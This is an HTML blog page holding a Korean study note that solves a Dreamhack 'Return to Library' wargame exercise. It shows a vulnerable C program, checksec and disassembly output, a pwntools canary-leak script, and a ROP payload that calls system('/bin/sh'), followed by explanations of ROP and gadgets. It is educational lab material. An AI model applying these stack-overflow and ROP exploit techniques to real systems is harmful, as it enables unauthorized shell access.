@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Return to Library · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag { background: var(--tag); border-radius: 4px; padding: .1rem .5rem; font-size: .72rem; color: var(--muted); }
+    .post-body { line-height: 1.85; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.4rem; font-weight: 400; margin: 2.2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.8rem 0 .5rem; }
+    .post-body h4 { font-size: .9rem; font-weight: 600; margin: 1.2rem 0 .4rem; color: var(--muted); }
+    .post-body p  { margin-bottom: 1rem; }
+    .post-body ul, .post-body ol { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .35rem; }
+    .post-body blockquote {
+      border-left: 3px solid var(--accent); margin: 1.2rem 0;
+      padding: .6rem 1rem; background: var(--tag); border-radius: 0 6px 6px 0;
+    }
+    .post-body blockquote p { margin: 0; color: var(--muted); font-style: italic; }
+    .post-body hr { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem; margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code { background: var(--tag); border-radius: 3px; padding: .1rem .35rem; font-size: .85em; }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem; transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+<main class="page">
+  <a class="back-link" href="../posts.html">← Back to Posts</a>
+  <div class="post-header">
+    <h1>Return to Library</h1>
+    <div class="post-meta">
+      <span>2026·04</span>
+      <span class="post-tag">Note</span>
+    </div>
+  </div>
+  <hr class="post-divider">
+  <div class="post-body">
+<h2>문제</h2>
+
+<p><strong>Exploit Tech: Return to Library에서 실습하는 문제입니다.</strong></p>
+
+<pre><code class="language-c">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0415]
+└─$ cat rtl.c
+// Name: rtl.c
+// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+const char* binsh = "/bin/sh";
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Add system function to plt's entry
+  system("echo 'system@plt'");
+
+  // Leak canary
+  printf("[1] Leak Canary\n");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  // Overwrite return address
+  printf("[2] Overwrite return address\n");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+
+  return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-bash">
+gef➤  checksec
+[+] checksec for '/home/hyeoni/Documents/Dreamhack/0415/rtl'
+Canary                        : ✓
+NX                            : ✓
+PIE                           : ✘
+Fortify                       : ✘
+RelRO                         : Partial
+</code></pre>
+
+<pre><code class="language-nasm">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x00000000004006f7 &lt;+0&gt;:     push   rbp
+   0x00000000004006f8 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004006fb &lt;+4&gt;:     sub    rsp,0x40
+   0x00000000004006ff &lt;+8&gt;:     mov    rax,QWORD PTR fs:0x28
+   0x0000000000400708 &lt;+17&gt;:    mov    QWORD PTR [rbp-0x8],rax
+   0x000000000040070c &lt;+21&gt;:    xor    eax,eax
+   0x000000000040070e &lt;+23&gt;:    mov    rax,QWORD PTR [rip+0x20095b]        # 0x601070 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x0000000000400715 &lt;+30&gt;:    mov    ecx,0x0
+   0x000000000040071a &lt;+35&gt;:    mov    edx,0x2
+   0x000000000040071f &lt;+40&gt;:    mov    esi,0x0
+   0x0000000000400724 &lt;+45&gt;:    mov    rdi,rax
+   0x0000000000400727 &lt;+48&gt;:    call   0x400600 &lt;setvbuf@plt&gt;
+   0x000000000040072c &lt;+53&gt;:    mov    rax,QWORD PTR [rip+0x20092d]        # 0x601060 &lt;stdout@@GLIBC_2.2.5&gt;
+   0x0000000000400733 &lt;+60&gt;:    mov    ecx,0x0
+   0x0000000000400738 &lt;+65&gt;:    mov    edx,0x2
+   0x000000000040073d &lt;+70&gt;:    mov    esi,0x0
+   0x0000000000400742 &lt;+75&gt;:    mov    rdi,rax
+   0x0000000000400745 &lt;+78&gt;:    call   0x400600 &lt;setvbuf@plt&gt;
+   0x000000000040074a &lt;+83&gt;:    mov    edi,0x40087c
+   0x000000000040074f &lt;+88&gt;:    mov    eax,0x0
+   0x0000000000400754 &lt;+93&gt;:    call   0x4005d0 &lt;system@plt&gt;
+   0x0000000000400759 &lt;+98&gt;:    mov    edi,0x40088e
+   0x000000000040075e &lt;+103&gt;:   call   0x4005b0 &lt;puts@plt&gt;
+   0x0000000000400763 &lt;+108&gt;:   mov    edi,0x40089e
+   0x0000000000400768 &lt;+113&gt;:   mov    eax,0x0
+   0x000000000040076d &lt;+118&gt;:   call   0x4005e0 &lt;printf@plt&gt;
+   0x0000000000400772 &lt;+123&gt;:   lea    rax,[rbp-0x40]
+   0x0000000000400776 &lt;+127&gt;:   mov    edx,0x100
+   0x000000000040077b &lt;+132&gt;:   mov    rsi,rax
+   0x000000000040077e &lt;+135&gt;:   mov    edi,0x0
+   0x0000000000400783 &lt;+140&gt;:   call   0x4005f0 &lt;read@plt&gt;
+   0x0000000000400788 &lt;+145&gt;:   lea    rax,[rbp-0x40]
+   0x000000000040078c &lt;+149&gt;:   mov    rsi,rax
+   0x000000000040078f &lt;+152&gt;:   mov    edi,0x4008a4
+   0x0000000000400794 &lt;+157&gt;:   mov    eax,0x0
+   0x0000000000400799 &lt;+162&gt;:   call   0x4005e0 &lt;printf@plt&gt;
+   0x000000000040079e &lt;+167&gt;:   mov    edi,0x4008ad
+   0x00000000004007a3 &lt;+172&gt;:   call   0x4005b0 &lt;puts@plt&gt;
+   0x00000000004007a8 &lt;+177&gt;:   mov    edi,0x40089e
+   0x00000000004007ad &lt;+182&gt;:   mov    eax,0x0
+   0x00000000004007b2 &lt;+187&gt;:   call   0x4005e0 &lt;printf@plt&gt;
+   0x00000000004007b7 &lt;+192&gt;:   lea    rax,[rbp-0x40]
+   0x00000000004007bb &lt;+196&gt;:   mov    edx,0x100
+   0x00000000004007c0 &lt;+201&gt;:   mov    rsi,rax
+   0x00000000004007c3 &lt;+204&gt;:   mov    edi,0x0
+   0x00000000004007c8 &lt;+209&gt;:   call   0x4005f0 &lt;read@plt&gt;
+   0x00000000004007cd &lt;+214&gt;:   mov    eax,0x0
+   0x00000000004007d2 &lt;+219&gt;:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x00000000004007d6 &lt;+223&gt;:   xor    rcx,QWORD PTR fs:0x28
+   0x00000000004007df &lt;+232&gt;:   je     0x4007e6 &lt;main+239&gt;
+   0x00000000004007e1 &lt;+234&gt;:   call   0x4005c0 &lt;__stack_chk_fail@plt&gt;
+   0x00000000004007e6 &lt;+239&gt;:   leave
+   0x00000000004007e7 &lt;+240&gt;:   ret
+End of assembler dump.
+</code></pre>
+
+<pre><code class="language-python">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0415]
+└─$ cat ./exploit.py
+from pwn import *
+
+s = process("./rtl")
+
+payload = b"A" * 57
+
+s.sendafter(b"Buf: ", payload)
+s.recvuntil(payload)
+leaked_byte = s.recv(7)
+canary = u64(b"\x00" + leaked_byte)
+
+print(f"[+] Leaked Canary: {hex(canary)}")
+
+s.interactive()
+</code></pre>
+
+<p>→canary 알아내기.</p>
+
+<pre><code class="language-python">
+rop = ROP(e)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+system_plt = e.plt['system']
+
+payload2 = b"A" * 56
+payload2 += p64(canary)
+payload2 += b"B" * 8
+payload2 += p64(ret)
+payload2 += p64(pop_rdi)
+payload2 += p64(binsh_addr)
+payload2 += p64(system_plt)
+</code></pre>
+
+<p>32-bit 의 경우 payload 에 dummy, canary 등을 다 연결하면 되었었지만, 64-bit 의 경우에는 함수의 첫 번째 인자를 <code>rdi</code> 레지스터를 통해 전달해야한다.</p>
+
+<h3>ROP (Return-Oriented Programming)</h3>
+
+<p>과거에는 쉘 코드를 직접 넣어놓고 실행시키는 buffer overflow 공격이 많았음 → NX(No-Execute) 보호 기법이 등장하면서 스택에 있는 데이터를 코드로 시행할 수 없게 되었음.</p>
+
+<p>→ ROP 등장.</p>
+
+<p>새로운 코드를 주입할 수 없다면, 이미 메모리에 실행 권한을 가지고 올라가 있는 정상적인 코드 조각들을 모아서 내가 원하는 동작을 조립하자</p>
+
+<h3>Gadget</h3>
+
+<p>gadget 은 프로그램 내부에 존재하는 아주 짧은 명령어의 연속이다. 모든 gadget 은 반드시 ret 명령어로 끝난다.</p>
+
+<p>예) pop rdi; ret</p>
+
+<p><strong><code>ret</code></strong></p>
+
+<p>ret = pop rip</p>
+
+<p>즉, 스택의 맨 위(RSP)에 있는 값을 꺼내서, 다음에 실행할 명령어 주소 레지스터(RIP)에 집어넣어라 라는 뜻.</p>
+
+<p>gadget이 <code>ret</code>으로 끝나기 때문에, 하나의 가젯 실행이 끝나면 자연스럽게 스택에 적혀있는 다음 가젯의 주소를 꺼내서 연쇄적으로 실행할 수 있게 된다.</p>
+  </div>
+</main>
+<script src="../../js/nav.js"></script>
+</body>
+</html>
